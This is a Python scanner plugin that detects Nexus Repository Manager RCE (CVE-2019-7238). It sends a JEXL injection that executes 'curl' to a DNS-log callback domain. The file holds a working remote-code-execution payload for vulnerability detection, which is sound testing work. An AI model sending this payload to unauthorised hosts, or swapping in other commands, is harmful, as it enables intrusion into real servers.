#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return

    domain = dns_monitor(ip, port).add_checker('nexus-rce', alert_group='Nexus RCE CVE-2019-7238')

    poc = {"action": "coreui_Component",
           "data": [
               {"filter": [
                 {"property": "repositoryName", "value": "*"},
                 {"property": "expression", "value": "1==0 or ''.class.forName('java.lang.Runtime')."
                                                     "getRuntime().exec(\"curl http://{}\")".format(domain)},
                 {"property": "type", "value": "jexl"}],
                "limit": 50,
                "page": 1,
                "sort": [{"direction": "ASC", "property": "name"}],
                "start": 0}
           ],
           "method": "previewAssets",
           "tid": 1,
           "type": "rpc"}
    
    target = '{}://{}:{}/service/extdirect'.format(service, ip, port)
    try:
        await http_client(ip, port).post(target, json=poc, timeout=20)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8081, 'http', True, task_msg={})
    run_plugin_test(scan)
